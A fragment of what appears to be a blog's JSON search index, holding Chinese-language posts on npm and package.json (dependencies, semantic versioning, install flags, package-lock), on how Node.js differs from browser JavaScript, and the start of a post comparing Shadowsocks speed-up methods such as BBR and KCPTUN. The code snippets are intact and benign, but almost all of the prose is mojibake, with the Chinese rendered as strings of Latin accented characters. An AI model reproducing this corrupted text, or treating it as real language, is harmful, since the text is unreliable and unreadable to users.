çš„æ„å»ºæ›´å¥½åœ°ä¸å…¶ä»–å¼€å‘è€…åˆ†äº«ï¼Œä¾¿äºé‡å¤ä½¿ç”¨\n\n  \n\nä½¿ç”¨ `npm init` å³å¯åœ¨å½“å‰ç›®å½•åˆ›å»ºä¸€ä¸ª `package.json` æ–‡ä»¶ã€‚å¦‚æœå«Œå›ç­”è¿™ä¸€å¤§å †é—®é¢˜éº»çƒ¦ï¼Œå¯ä»¥ç›´æ¥è¾“å…¥` npm init -â€”yes` è·³è¿‡å›ç­”é—®é¢˜æ­¥éª¤ï¼Œç›´æ¥ç”Ÿæˆé»˜è®¤å€¼çš„ package.json æ–‡ä»¶ï¼š\n\n```json\n{\n  \"name\": \"package\",\n  \"version\": \"1.0.0\",\n  \"description\": \"\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\"\n  },\n  \"keywords\": [],\n  \"author\": \"\",\n  \"license\": \"ISC\"\n}\n```\n\n\n\n#### 3.1 package.json çš„å†…å®¹\n\n\n\n##### 3.1.1 `package.json` æ–‡ä»¶è‡³å°‘è¦æœ‰ä¸¤éƒ¨åˆ†å†…å®¹ï¼š\n\n1. â€œnameâ€\n   - å…¨éƒ¨å°å†™ï¼Œæ²¡æœ‰ç©ºæ ¼ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹åˆ’çº¿æˆ–è€…æ¨ªçº¿\n2. â€œversionâ€ \n   - x.x.x çš„æ ¼å¼\n   - ç¬¦åˆâ€œè¯­ä¹‰åŒ–ç‰ˆæœ¬è§„åˆ™â€\n\n\n\n##### 3.1.2 å…¶ä»–å†…å®¹ï¼š\n\n+ descriptionï¼šæè¿°ä¿¡æ¯ï¼Œæœ‰åŠ©äºæœç´¢\n+ main: `å…¥å£æ–‡ä»¶`ï¼Œä¸€èˆ¬éƒ½æ˜¯ index.js. å½“ä½¿ç”¨require()è¯­æ³•æ¥åŠ è½½ä¸€ä¸ªæ¨¡å—æ—¶ï¼Œå°±ä¼šçœ‹æ­¤å€¼\n+ scriptsï¼šæ”¯æŒçš„è„šæœ¬ï¼Œé»˜è®¤æ˜¯ä¸€ä¸ªç©ºçš„ test\n+ keywordsï¼šå…³é”®å­—ï¼Œæœ‰åŠ©äºåœ¨äººä»¬ä½¿ç”¨ npm search æœç´¢æ—¶å‘ç°ä½ çš„é¡¹ç›®\n+ authorï¼šä½œè€…ä¿¡æ¯\n+ licenseï¼šé»˜è®¤æ˜¯ MIT\n+ bugsï¼šå½“å‰é¡¹ç›®çš„ä¸€äº›é”™è¯¯ä¿¡æ¯ï¼Œå¦‚æœæœ‰çš„è¯\n\n\n\n##### 3.1.3 scriptså±æ€§\n\nå¯ä»¥æŒ‡å®šnpmå‘½ä»¤ç¼©å†™ã€‚\n\n```\n  \"scripts\": {\n    \"start\": \"node store.js\"\n  },\n```\n\n\n\næ‰§è¡Œnpm run startä»ç„¶å¯ä»¥è¿è¡ŒæˆåŠŸï¼Œé€šè¿‡scriptså±æ€§npm run startç­‰ä»·äºnode store.jsã€‚å…³äºscriptsçš„æ›´å…·ä½“çš„ä½¿ç”¨[è¯·çœ‹è¿™é‡Œ](http://www.ruanyifeng.com/blog/2016/10/npm_scripts.html)ã€‚\n\n\n\n#### 3.2 æŒ‡å®šä¾èµ–çš„åŒ…\n\næˆ‘ä»¬éœ€è¦åœ¨ `package.json` æ–‡ä»¶ä¸­æŒ‡å®šé¡¹ç›®ä¾èµ–çš„åŒ…ï¼Œè¿™æ ·åˆ«äººåœ¨æ‹¿åˆ°è¿™ä¸ªé¡¹ç›®æ—¶æ‰å¯ä»¥ä½¿ç”¨ `npm install` ä¸‹è½½ã€‚\n\nåŒ…æœ‰ä¸¤ç§ä¾èµ–æ–¹å¼ï¼š\n\n1. `dependencies`ï¼šåœ¨ç”Ÿäº§ç¯å¢ƒä¸­éœ€è¦ç”¨åˆ°çš„ä¾èµ–\n2. `devDependencies`ï¼šåœ¨å¼€å‘ã€æµ‹è¯•ç¯å¢ƒä¸­ç”¨åˆ°çš„ä¾èµ–\n\n\n\nä¸¾ä¸ªä¾‹å­ï¼š\n\n```\n{\n    \"name\": \"my-weex-demo\",\n    \"version\": \"1.0.0\",\n    \"description\": \"a weex project\",\n    \"main\": \"index.js\",\n    \"devDependencies\": {\n        \"babel-core\": \"^6.14.0\",\n        \"babel-loader\": \"^6.2.5\",\n        \"babel-preset-es2015\": \"^6.18.0\",\n        \"vue-loader\": \"^10.0.2\",\n        \"eslint\": \"^3.5.0\",\n        \"serve\": \"^1.4.0\",\n        \"webpack\": \"^1.13.2\",\n        \"weex-loader\": \"^0.3.3\",\n        \"weex-builder\": \"^0.2.6\"\n    },\n    \"dependencies\": {\n        \"weex-html5\": \"^0.3.2\",\n        \"weex-components\": \"*\"\n    }\n}\n```\n\n\n\n#### 3.3 semantic versioningï¼ˆè¯­ä¹‰åŒ–ç‰ˆæœ¬è§„åˆ™ï¼‰\n\n\n\ndependencies çš„å†…å®¹ï¼Œä»¥ \"weex-html5\": \"^0.3.2\" ä¸ºä¾‹ï¼Œæˆ‘ä»¬çŸ¥é“ key æ˜¯ä¾èµ–çš„åŒ…åç§°ï¼Œvalue æ˜¯è¿™ä¸ªåŒ…çš„ç‰ˆæœ¬ã€‚é‚£ç‰ˆæœ¬å‰é¢çš„ ^ æˆ–è€…ç‰ˆæœ¬ç›´æ¥æ˜¯ä¸€ä¸ª * æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿè¿™å°±æ˜¯ npm çš„ â€œSemantic versioningâ€ï¼Œç®€ç§°â€Semverâ€ï¼Œä¸­æ–‡å«ä¹‰å³â€œè¯­ä¹‰åŒ–ç‰ˆæœ¬è§„åˆ™â€ã€‚\n\nåœ¨å¼€å‘ä¸­æˆ‘ä»¬æœ‰è¿‡è¿™æ ·çš„ç»éªŒï¼šæœ‰æ—¶å€™ä¾èµ–çš„åŒ…å‡çº§åå¤§æ”¹ç‰ˆï¼Œä¹‹å‰æä¾›çš„æ¥å£ä¸è§äº†ï¼Œè¿™å¯¹ä½¿ç”¨è€…çš„é¡¹ç›®å¯èƒ½é€ æˆæå¤§çš„å½±å“ã€‚å› æ­¤æˆ‘ä»¬åœ¨å£°æ˜å¯¹æŸä¸ªåŒ…çš„ä¾èµ–æ—¶éœ€è¦æŒ‡æ˜æ˜¯å¦å…è®¸ update åˆ°æ–°ç‰ˆæœ¬ï¼Œä»€ä¹ˆæƒ…å†µä¸‹å…è®¸æ›´æ–°ã€‚è¿™å°±éœ€è¦å…ˆäº†è§£ npm åŒ…æä¾›è€…åº”è¯¥æ³¨æ„çš„ç‰ˆæœ¬å·è§„èŒƒã€‚\n\n\n\nå¦‚æœä¸€ä¸ªé¡¹ç›®æ‰“ç®—ä¸åˆ«äººåˆ†äº«ï¼Œåº”è¯¥ä» 1.0.0 ç‰ˆæœ¬å¼€å§‹ã€‚ä»¥åè¦å‡çº§ç‰ˆæœ¬åº”è¯¥éµå¾ªä»¥ä¸‹æ ‡å‡†ï¼š\n\n```\nè¡¥ä¸ç‰ˆæœ¬ï¼šè§£å†³äº† Bug æˆ–è€…ä¸€äº›è¾ƒå°çš„æ›´æ”¹ï¼Œå¢åŠ æœ€åä¸€ä½æ•°å­—ï¼Œæ¯”å¦‚ 1.0.1\nå°ç‰ˆæœ¬ï¼šå¢åŠ äº†æ–°ç‰¹æ€§ï¼ŒåŒæ—¶ä¸ä¼šå½±å“ä¹‹å‰çš„ç‰ˆæœ¬ï¼Œå¢åŠ ä¸­é—´ä¸€ä½æ•°å­—ï¼Œæ¯”å¦‚ 1.1.0\nå¤§ç‰ˆæœ¬ï¼šå¤§æ”¹ç‰ˆï¼Œæ— æ³•å…¼å®¹ä¹‹å‰çš„ï¼Œå¢åŠ ç¬¬ä¸€ä½æ•°å­—ï¼Œæ¯”å¦‚ 2.0.0\n\näº†è§£äº†æä¾›è€…çš„ç‰ˆæœ¬è§„èŒƒåï¼Œ npm åŒ…ä½¿ç”¨è€…å°±å¯ä»¥é’ˆå¯¹è‡ªå·±çš„éœ€è¦å¡«å†™ä¾èµ–åŒ…çš„ç‰ˆæœ¬è§„åˆ™ã€‚\n```\n\n\n\nä½œä¸ºä½¿ç”¨è€…ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ package.json æ–‡ä»¶ä¸­å†™æ˜æˆ‘ä»¬å¯ä»¥æ¥å—è¿™ä¸ªåŒ…çš„æ›´æ–°ç¨‹åº¦ï¼ˆå‡è®¾å½“å‰ä¾èµ–çš„æ˜¯ 1.0.4 ç‰ˆæœ¬ï¼‰ï¼š\n\nå¦‚æœåªæ‰“ç®—æ¥å—è¡¥ä¸ç‰ˆæœ¬çš„æ›´æ–°ï¼ˆä¹Ÿå°±æ˜¯æœ€åä¸€ä½çš„æ”¹å˜ï¼‰ï¼Œå°±å¯ä»¥è¿™ä¹ˆå†™ï¼š \n\n```\n1.0\n1.0.x\n~1.0.4\n```\n\nå¦‚æœæ¥å—å°ç‰ˆæœ¬çš„æ›´æ–°ï¼ˆç¬¬äºŒä½çš„æ”¹å˜ï¼‰ï¼Œå°±å¯ä»¥è¿™ä¹ˆå†™ï¼š \n\n```\n1\n1.x\n^1.0.4\n```\n\nå¦‚æœå¯ä»¥æ¥å—å¤§ç‰ˆæœ¬çš„æ›´æ–°ï¼ˆè‡ªç„¶æ¥å—å°ç‰ˆæœ¬å’Œè¡¥ä¸ç‰ˆæœ¬çš„æ”¹å˜ï¼‰ï¼Œå°±å¯ä»¥è¿™ä¹ˆå†™ï¼š \n\n```\n*\nx\n```\n\n\nå°ç»“ä¸€ä¸‹ï¼šæ€»å…±ä¸‰ç§ç‰ˆæœ¬å˜åŒ–ç±»å‹ï¼Œæ¥å—ä¾èµ–åŒ…å“ªç§ç±»å‹çš„æ›´æ–°ï¼Œå°±æŠŠç‰ˆæœ¬å·å‡†ç¡®å†™åˆ°å‰ä¸€ä½ã€‚\n\n\n\n\n\n### 4. å…¶ä»–å®‰è£…çŸ¥è¯†\n\n\n\n#### 4.1 å®‰è£…å‚æ•° --save å’Œ --save -dev\n\næ·»åŠ ä¾èµ–æ—¶æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨ä¿®æ”¹ package.json æ–‡ä»¶ï¼Œæ·»åŠ æˆ–è€…ä¿®æ”¹ dependencies devDependencies ä¸­çš„å†…å®¹å³å¯ã€‚å¦ä¸€ç§æ›´é…·çš„æ–¹å¼æ˜¯ç”¨å‘½ä»¤è¡Œï¼Œåœ¨ä½¿ç”¨ npm install æ—¶å¢åŠ  --save æˆ–è€… --save -dev åç¼€ï¼š\n\n```\nnpm install <package_name> --save è¡¨ç¤ºå°†è¿™ä¸ªåŒ…ååŠå¯¹åº”çš„ç‰ˆæœ¬æ·»åŠ åˆ° package.jsonçš„ dependencies\n\nnpm install <package_name> --save-dev è¡¨ç¤ºå°†è¿™ä¸ªåŒ…ååŠå¯¹åº”çš„ç‰ˆæœ¬æ·»åŠ åˆ° package.jsonçš„ devDependencies\n```\n\ndependenciesï¼šåœ¨ç”Ÿäº§ç¯å¢ƒä¸­éœ€è¦ç”¨åˆ°çš„ä¾èµ–\n\ndevDependenciesï¼šåœ¨å¼€å‘ã€æµ‹è¯•ç¯å¢ƒä¸­ç”¨åˆ°çš„ä¾èµ–\n\n\n\n#### 4.2 å…¨å±€å®‰è£… package\n\nå¦‚æœä½ æƒ³è¦ç›´æ¥åœ¨å‘½ä»¤è¡Œä¸­ä½¿ç”¨æŸä¸ªåŒ…ï¼Œæ¯”å¦‚ jshint ï¼Œä½ å¯ä»¥å…¨å±€å®‰è£…å®ƒã€‚å…¨å±€å®‰è£…æ¯”æœ¬åœ°å®‰è£…å¤šäº†ä¸ª -g:\n\n```\nnpm install -g <package-name>\n```\n\nå®‰è£…åå¯ä»¥ä½¿ç”¨ npm ls -g --depth=0 æŸ¥çœ‹å®‰è£…åœ¨å…¨å±€ç¬¬ä¸€å±‚çš„åŒ…ã€‚\n\n##### 4.2.1 å…¨å±€å®‰è£…çš„æƒé™é—®é¢˜\n\nåœ¨å…¨å±€å®‰è£…æ—¶å¯èƒ½ä¼šé‡åˆ° EACCES æƒé™é—®é¢˜, å¯ä»¥å¦‚ä¸‹è§£å†³ï¼š\n\n1.ä½¿ç”¨ sudo ç®€å•ç²—æš´ï¼Œä½†æ˜¯æ²»æ ‡ä¸æ²»æœ¬\n\n2.ä¿®æ”¹ npm å…¨å±€é»˜è®¤ç›®å½•çš„æƒé™\n\nå…ˆè·å– npm å…¨å±€ç›®å½•ï¼š`npm config get prefix`ï¼Œä¸€èˆ¬éƒ½æ˜¯ /usr/localï¼› ç„¶åä¿®æ”¹è¿™ä¸ªç›®å½•æƒé™ä¸ºå½“å‰ç”¨æˆ·ï¼š\n\n```shell\nsudo chown -R $(whoami) $(npm config get prefix)/{lib/node_modules,bin,share}\n```\n\n\n\n#### 4.3 package-lock.json\n\nåŸæ¥package.jsonæ–‡ä»¶åªèƒ½é”å®šå¤§ç‰ˆæœ¬ï¼Œä¹Ÿå°±æ˜¯ç‰ˆæœ¬å·çš„ç¬¬ä¸€ä½ï¼Œå¹¶ä¸èƒ½é”å®šåé¢çš„å°ç‰ˆæœ¬ï¼Œä½ æ¯æ¬¡npm installéƒ½æ˜¯æ‹‰å–çš„è¯¥å¤§ç‰ˆæœ¬ä¸‹çš„æœ€æ–°çš„ç‰ˆæœ¬ï¼Œä¸ºäº†ç¨³å®šæ€§è€ƒè™‘æˆ‘ä»¬å‡ ä¹æ˜¯ä¸æ•¢éšæ„å‡çº§ä¾èµ–åŒ…çš„ï¼Œè¿™å°†å¯¼è‡´å¤šå‡ºæ¥å¾ˆå¤šå·¥ä½œé‡ï¼Œæµ‹è¯•/é€‚é…ç­‰ï¼Œæ‰€ä»¥package-lock.jsonæ–‡ä»¶å‡ºæ¥äº†ï¼Œå½“ä½ æ¯æ¬¡å®‰è£…ä¸€ä¸ªä¾èµ–çš„æ—¶å€™å°±é”å®šåœ¨ä½ å®‰è£…çš„è¿™ä¸ªç‰ˆæœ¬ã€‚\n\né‚£å¦‚æœæˆ‘ä»¬å®‰è£…æ—¶çš„åŒ…æœ‰bugï¼Œåé¢éœ€è¦æ›´æ–°æ€ä¹ˆåŠï¼Ÿ\n\n åœ¨ä»¥å‰å¯èƒ½å°±æ˜¯ç›´æ¥æ”¹package.jsoné‡Œé¢çš„ç‰ˆæœ¬ï¼Œç„¶åå†npm installäº†ï¼Œä½†æ˜¯5ç‰ˆæœ¬åå°±ä¸æ”¯æŒè¿™æ ·åšäº†ï¼Œå› ä¸ºç‰ˆæœ¬å·²ç»é”å®šåœ¨package-lock.jsoné‡Œäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½npm install xxx@x.x.x  è¿™æ ·å»æ›´æ–°æˆ‘ä»¬çš„ä¾èµ–ï¼Œç„¶åpackage-lock.jsonä¹Ÿèƒ½éšä¹‹æ›´æ–°ã€‚\n\n\n\n\n\n### å‚è€ƒèµ„æ–™:\n\nhttp://www.ruanyifeng.com/blog/2016/01/npm-install.html\n\nhttp://www.ruanyifeng.com/blog/2016/10/npm_scripts.html\n\nhttps://blog.csdn.net/u011240877/article/details/76582670","tags":["nodejs"],"categories":["nodejs"]},{"title":"nodejsä»‹ç»å’Œjavascriptçš„åŒºåˆ«","url":"%2Fp%2F74d8b7c3.html","content":"\n### 1. nodejsçš„è¯ç”Ÿ\n\nè¯è¯´æœ‰ä¸ªå«Ryan Dahlçš„æ­ªæœä»ï¼Œä»–çš„å·¥ä½œæ˜¯ç”¨C/C++å†™é«˜æ€§èƒ½WebæœåŠ¡ã€‚å¯¹äºé«˜æ€§èƒ½ï¼Œå¼‚æ­¥IOã€äº‹ä»¶é©±åŠ¨æ˜¯åŸºæœ¬åŸåˆ™ï¼Œä½†æ˜¯ç”¨C/C++å†™å°±å¤ªç—›è‹¦äº†ã€‚äºæ˜¯è¿™ä½ä»å…„å¼€å§‹è®¾æƒ³ç”¨é«˜çº§è¯­è¨€å¼€å‘WebæœåŠ¡ã€‚ä»–è¯„ä¼°äº†å¾ˆå¤šç§é«˜çº§è¯­è¨€ï¼Œå‘ç°å¾ˆå¤šè¯­è¨€è™½ç„¶åŒæ—¶æä¾›äº†åŒæ­¥IOå’Œå¼‚æ­¥IOï¼Œä½†æ˜¯å¼€å‘äººå‘˜ä¸€æ—¦ç”¨äº†åŒæ­¥IOï¼Œä»–ä»¬å°±å†ä¹Ÿæ‡’å¾—å†™å¼‚æ­¥IOäº†ï¼Œæ‰€ä»¥ï¼Œæœ€ç»ˆï¼ŒRyanç„å‘äº†JavaScriptã€‚\n\nå› ä¸ºJavaScriptæ˜¯å•çº¿ç¨‹æ‰§è¡Œï¼Œæ ¹æœ¬ä¸èƒ½è¿›è¡ŒåŒæ­¥IOæ“ä½œï¼Œæ‰€ä»¥ï¼ŒJavaScriptçš„è¿™ä¸€â€œç¼ºé™·â€å¯¼è‡´äº†å®ƒåªèƒ½ä½¿ç”¨å¼‚æ­¥IOã€‚\n\né€‰å®šäº†å¼€å‘è¯­è¨€ï¼Œè¿˜è¦æœ‰è¿è¡Œæ—¶å¼•æ“ã€‚è¿™ä½ä»å…„æ›¾è€ƒè™‘è¿‡è‡ªå·±å†™ä¸€ä¸ªï¼Œä¸è¿‡æ˜æ™ºåœ°æ”¾å¼ƒäº†ï¼Œå› ä¸ºV8å°±æ˜¯å¼€æºçš„JavaScriptå¼•æ“ã€‚è®©GoogleæŠ•èµ„å»ä¼˜åŒ–V8ï¼Œå’±åªè´Ÿè´£æ”¹é€ ä¸€ä¸‹æ‹¿æ¥ç”¨ï¼Œè¿˜ä¸ç”¨ä»˜é’±ï¼Œè¿™ä¸ªä¹°å–å¾ˆåˆ’ç®—ã€‚\n\näºæ˜¯åœ¨2009å¹´ï¼ŒRyanæ­£å¼æ¨å‡ºäº†åŸºäºJavaScriptè¯­è¨€å’ŒV8å¼•æ“çš„å¼€æºWebæœåŠ¡å™¨é¡¹ç›®ï¼Œå‘½åä¸ºNode.jsã€‚è™½ç„¶åå­—å¾ˆåœŸï¼Œä½†æ˜¯ï¼ŒNodeç¬¬ä¸€æ¬¡æŠŠJavaScriptå¸¦å…¥åˆ°åç«¯æœåŠ¡å™¨å¼€å‘ï¼ŒåŠ ä¸Šä¸–ç•Œä¸Šå·²ç»æœ‰æ— æ•°çš„JavaScriptå¼€å‘äººå‘˜ï¼Œæ‰€ä»¥Nodeä¸€ä¸‹å­å°±ç«äº†èµ·æ¥ã€‚\n\n<!-- more -->\n\n>  åœ¨Nodeä¸Šè¿è¡Œçš„JavaScriptç›¸æ¯”å…¶ä»–åç«¯å¼€å‘è¯­è¨€æœ‰ä½•ä¼˜åŠ¿ï¼Ÿ\n\næœ€å¤§çš„ä¼˜åŠ¿æ˜¯å€ŸåŠ©JavaScriptå¤©ç”Ÿçš„äº‹ä»¶é©±åŠ¨æœºåˆ¶åŠ V8é«˜æ€§èƒ½å¼•æ“ï¼Œä½¿ç¼–å†™é«˜æ€§èƒ½WebæœåŠ¡è½»è€Œæ˜“ä¸¾ã€‚\n\nå…¶æ¬¡ï¼ŒJavaScriptè¯­è¨€æœ¬èº«æ˜¯å®Œå–„çš„å‡½æ•°å¼è¯­è¨€ï¼Œåœ¨å‰ç«¯å¼€å‘æ—¶ï¼Œå¼€å‘äººå‘˜å¾€å¾€å†™å¾—æ¯”è¾ƒéšæ„ï¼Œè®©äººæ„Ÿè§‰JavaScriptå°±æ˜¯ä¸ªâ€œç©å…·è¯­è¨€â€ã€‚ä½†æ˜¯ï¼Œåœ¨Nodeç¯å¢ƒä¸‹ï¼Œé€šè¿‡æ¨¡å—åŒ–çš„JavaScriptä»£ç ï¼ŒåŠ ä¸Šå‡½æ•°å¼ç¼–ç¨‹ï¼Œå¹¶ä¸”æ— éœ€è€ƒè™‘æµè§ˆå™¨å…¼å®¹æ€§é—®é¢˜ï¼Œç›´æ¥ä½¿ç”¨æœ€æ–°çš„ECMAScript 6æ ‡å‡†ï¼Œå¯ä»¥å®Œå…¨æ»¡è¶³å·¥ç¨‹ä¸Šçš„éœ€æ±‚ã€‚\n\n\n\n### 2. nodeJså’Œjavascriptçš„å¼‚åŒ\n\næˆ‘ç›¸ä¿¡å¾ˆå¤šå…¥å‘Nodejsçš„äººéƒ½æ˜¯å‰ç«¯è½¬è¿‡æ¥çš„ï¼Œä½†æ˜¯å±€é™äºå…¬å¸é¡¹ç›®ç”¨ä¸åˆ°Nodejsï¼Œåªèƒ½è‡ªå­¦ï¼Œæœ‰äº›é‡è¦ä¸”åŸºç¡€çš„ä¸œè¥¿å°±å¿½ç•¥äº†ã€‚\n\nå‰ç«¯çš„JavaScriptå…¶å®æ˜¯ç”±ECMAScriptã€DOMã€BOMç»„åˆè€Œæˆã€‚JavaScript=ECMAScript+DOM+BOMã€‚\n\n#### 2.1 javascriptï¼š\n\n- ECMAScript(è¯­è¨€åŸºç¡€ï¼Œå¦‚ï¼šè¯­æ³•ã€æ•°æ®ç±»å‹ç»“æ„ä»¥åŠä¸€äº›å†…ç½®å¯¹è±¡)\n- DOMï¼ˆä¸€äº›æ“ä½œé¡µé¢å…ƒç´ çš„æ–¹æ³•ï¼‰\n- BOMï¼ˆä¸€äº›æ“ä½œæµè§ˆå™¨çš„æ–¹æ³•ï¼‰\n\nä¸Šé¢æ˜¯JavaScriptçš„ç»„æˆéƒ¨åˆ†ï¼Œé‚£ä¹ˆNodejså‘¢ï¼Ÿ\n\n#### 2.2 nodejsï¼š\n\n- ECMAScript(è¯­è¨€åŸºç¡€ï¼Œå¦‚ï¼šè¯­æ³•ã€æ•°æ®ç±»å‹ç»“æ„ä»¥åŠä¸€äº›å†…ç½®å¯¹è±¡)\n- os(æ“ä½œç³»ç»Ÿ)\n- file(æ–‡ä»¶ç³»ç»Ÿ)\n- net(ç½‘ç»œç³»ç»Ÿ)\n- database(æ•°æ®åº“)\n\nåˆ†æï¼šå¾ˆå®¹æ˜“çœ‹å‡ºï¼Œå‰ç«¯å’Œåç«¯çš„jsç›¸åŒç‚¹å°±æ˜¯ï¼Œä»–ä»¬çš„è¯­è¨€åŸºç¡€éƒ½æ˜¯ECMAScriptï¼Œåªæ˜¯ä»–ä»¬æ‰€æ‰©å±•çš„ä¸œè¥¿ä¸åŒï¼Œå‰ç«¯éœ€è¦æ“ä½œé¡µé¢å…ƒç´ ï¼Œäºæ˜¯æ‰©å±•äº†DOMï¼Œä¹Ÿéœ€è¦æ“ä½œæµè§ˆå™¨ï¼Œäºæ˜¯å°±æ‰©å±•äº†BOMã€‚è€ŒæœåŠ¡ç«¯çš„jsåˆ™ä¹Ÿæ˜¯åŸºäºECMAScriptæ‰©å±•å‡ºäº†æœåŠ¡ç«¯æ‰€éœ€è¦çš„ä¸€äº›APIï¼Œç¨å¾®äº†è§£åå°çš„ç«¥é‹è‚¯å®šçŸ¥é“ï¼Œåå°è¯­éŸ³æœ‰æ“ä½œç³»ç»Ÿçš„èƒ½åŠ›ï¼Œäºæ˜¯æ‰©å±•osï¼Œéœ€è¦æœ‰æ“ä½œæ–‡ä»¶çš„èƒ½åŠ›ï¼Œäºæ˜¯æ‰©å±•å‡ºfileæ–‡ä»¶ç³»ç»Ÿã€éœ€è¦æ“ä½œç½‘ç»œï¼Œäºæ˜¯æ‰©å±•å‡ºnetç½‘ç»œç³»ç»Ÿï¼Œéœ€è¦æ“ä½œæ•°æ®ï¼Œäºæ˜¯è¦æ‰©å±•å‡ºdatabaseçš„èƒ½åŠ›ã€‚\n\nè¿™ä¹ˆä¸€å¯¹æ¯”ï¼Œç›¸ä¿¡å¾ˆå¤šå°ä¼™ä¼´å¯¹nodejsæ›´åŠ äº†è§£äº†ï¼ŒåŸæ¥å‰ç«¯å’ŒæœåŠ¡ç«¯çš„jså¦‚æ­¤ç›¸ä¼¼ï¼Œä»–ä»¬çš„åŸºç¡€æ˜¯ç›¸åŒçš„ï¼Œåªæ˜¯ç¯å¢ƒä¸åŒï¼Œå¯¼è‡´ä»–ä»¬æ‰©å±•å‡ºæ¥çš„ä¸œè¥¿ä¸åŒè€Œå·²ã€‚\n\n\n\n### 3. æ€»ç»“:\n\nåœ¨ecmascriptéƒ¨åˆ†nodeå’ŒJSå…¶å®æ˜¯ä¸€æ ·çš„ï¼Œæ¯”å¦‚ä¸æ•°æ®ç±»å‹çš„å®šä¹‰ã€è¯­æ³•ç»“æ„ï¼Œå†…ç½®å¯¹è±¡ã€‚\n\nä¾‹å¦‚jsä¸­çš„é¡¶å±‚å¯¹è±¡æ˜¯windowå¯¹è±¡ï¼Œä½†æ˜¯åœ¨nodeä¸­æ²¡æœ‰ä»€ä¹ˆwindowå¯¹è±¡ï¼Œnodeä¸­çš„é¡¶å±‚å¯¹è±¡æ˜¯globalå¯¹è±¡ã€‚","tags":["nodejs"],"categories":["nodejs"]},{"title":"shadowsocksåŠ é€Ÿçš„å‡ ç§æ–¹æ¡ˆ","url":"%2Fp%2F4241e56c.html","content":"\n\n\nç”±äºå›½å¤–VPSæœåŠ¡å™¨ä¸å›½å†…ç”¨æˆ·è·ç¦»è¾ƒè¿œï¼Œè¿æ¥çº¿è·¯é”™ç»¼å¤æ‚ï¼Œåœ¨æ•°æ®ä¼ è¾“è¿‡ç¨‹ä¸­çš„æ‹¥å µå’Œä¸¢åŒ…è¾ƒä¸ºä¸¥é‡ï¼Œä»è€Œé€ æˆè¿æ¥é€Ÿåº¦æé€Ÿä¸‹é™ï¼Œæå¤§å½±å“ä½¿ç”¨ä½“éªŒã€‚é€šè¿‡åŠ é€Ÿå·¥å…·å¯¹ç½‘ç»œåŠ é€Ÿå¤„ç†åï¼Œå¯ä»¥æ˜æ˜¾æ”¹å–„ç½‘ç»œä¼ è¾“é€Ÿåº¦ï¼Œæå‡ç”¨æˆ·ä½“éªŒã€‚\n\nå¦‚æœä½ æ­£åœ¨ä½¿ç”¨Shadowsocks/V2rayç­‰ç§‘å­¦ä¸Šç½‘å·¥å…·ï¼Œé‚£ä¹ˆç»è¿‡åŠ é€Ÿåçš„ç½‘ç»œï¼Œé€Ÿåº¦ä¼šæœ‰å‡ åå€ç”šè‡³ä¸Šç™¾å€çš„æå‡ï¼Œåœ¨è§‚çœ‹Youtubeè§†é¢‘æ—¶æ•ˆæœå°¤å…¶æ˜æ˜¾ã€‚\n\n\n\n### 1. VPSæœåŠ¡å™¨å¯ç”¨çš„åŠ é€Ÿæ–¹æ¡ˆ\n\nç›¸æ¯”OpenVZæ¶æ„ï¼ŒKVMçš„å…¨è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œä½¿å…¶ç³»ç»Ÿå†…æ ¸å¯ä»¥è¢«éšæ„æ›´æ¢ã€‚æœ‰äº†è¿™ä¸€ç‰¹æ€§åŠ æŒï¼ŒKVMæ¶æ„çš„æœåŠ¡å™¨åŸºæœ¬å¯ä»¥é€‚é…æ‰€æœ‰ç½‘ç»œåŠ é€Ÿæ–¹æ¡ˆã€‚\n\nKVMå¯ç”¨ä¸»æµåŠ é€Ÿæ–¹æ¡ˆï¼š\n\n- åŸç‰ˆBBR\n- é­”æ”¹BBR\n- é”é€Ÿ\n- KCPTUN\n\né™¤ç‰¹æ®Šæƒ…å†µå¤–ï¼ŒKVMå¯ç”¨çš„åŠ é€Ÿæ–¹æ¡ˆï¼ŒXENæ¶æ„ä¹Ÿèƒ½ç”¨ã€‚\n\n<!-- more -->\n\n**å‡ ç§æ–¹æ¡ˆçš„åŠ é€Ÿæ•ˆæœæ’è¡Œ:**\n\n+ æ ¹æ®åŠ é€Ÿæ•ˆæœï¼šKCPTUN > é­”æ”¹BBR â‰¥ é”é€Ÿ > åŸç‰ˆBBR > æ— åŠ é€Ÿ\n\n+ æ ¹æ®å®‰è£…ä¾¿åˆ©ç¨‹åº¦ï¼šåŸç‰ˆBBR > é­”æ”¹BBR > é”é€Ÿ â‰¥ KCPTUN\n\n\n\nä¾¿åˆ©ç¨‹åº¦è¿™ä¸€é¡¹æœ‰å¿…è¦è¯¦ç»†ä»‹ç»ä¸‹ï¼š\n\nå…¶å®KCPTUNæ’æœ€åæœ‰ç‚¹å§”å±ˆï¼Œå®ƒä¸€ä¸æŒ‘æ¶æ„ã€äºŒä¸æŒ‘ç³»ç»Ÿï¼ŒåŸºæœ¬æ˜¯ä¸ªæœåŠ¡å™¨å°±èƒ½è£…ã€‚ä¹‹æ‰€ä»¥æ’åé åï¼Œä»…ä»…æ˜¯å› ä¸ºå®ƒæ˜¯å”¯ä¸€éœ€è¦å®¢æˆ·ç«¯çš„åŠ é€Ÿæ–¹æ¡ˆã€‚\n\né”é€Ÿä¸ºä»€ä¹ˆæ’åä¹Ÿé åï¼Ÿå› ä¸ºå®ƒå¤ªæŒ‘ç³»ç»Ÿå†…æ ¸ï¼Œå¯¹çš„å†…æ ¸å‡ ç§’å®‰è£…æˆåŠŸï¼Œä¸å¯¹çš„å†…æ ¸ç›´æ¥å®‰è£…ä¸ä¸Šã€‚\n\n\n\nä¸€ã€KCPTUN\n\nKCPTUNçš„åŠ é€Ÿæ•ˆæœæœ€ä¸ºçªå‡ºï¼Œåœ¨ä½¿ç”¨æ—¶ï¼Œé™¤äº†éœ€è¦å®‰è£…KCPTUNæœåŠ¡å™¨ç«¯å¤–ï¼Œè¿˜éœ€è¦åœ¨æœ¬åœ°è®¾å¤‡ä¸Šå®‰è£…KCPTUNå®¢æˆ·ç«¯ã€‚\n\nä¼˜ç‚¹ï¼šä¸æŒ‘æ¶æ„ï¼ŒOpenVZä¹Ÿèƒ½è£…ï¼›ä¸æŒ‘ç³»ç»Ÿç‰ˆæœ¬ï¼›åŠ 